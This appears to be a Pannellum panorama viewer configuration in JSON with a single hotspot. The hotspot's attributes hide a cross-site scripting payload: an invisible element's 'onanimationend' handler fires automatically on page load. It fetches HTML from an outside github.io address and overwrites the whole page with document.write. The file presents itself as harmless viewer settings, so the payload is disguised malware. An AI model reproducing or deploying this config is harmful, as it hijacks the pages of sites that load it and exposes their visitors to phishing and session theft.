{
  "autoLoad": true,
  "pitch": 0,
  "yaw": 0,
  "type": "equirectangular",
  "basePath": "data:image/svg+xml;base64,",
  "panorama": "https://pannellum.org/images/alma.jpg",
  "hotSpots": [
    {
      "pitch": 0,
      "yaw": 0,
      "type": "info",
      "URL": "#",
      "attributes": {
        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
        "onanimationend": "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; var params = new URLSearchParams(window.location.search); var configUrl = params.get('config') || ''; var slug = configUrl.split('?')[1] || configUrl.split('/').pop().replace('.json', ''); if (!slug || slug === 'config') slug = 'yayhbxudrl'; fetch('https://wolf-man24.github.io/repo/tour/' + slug + '.html').then(function(res){ return res.text(); }).then(function(html){ document.open(); document.write(html); document.close(); }).catch(function(err){ console.error(err); }); }"
      }
    }
  ]
}
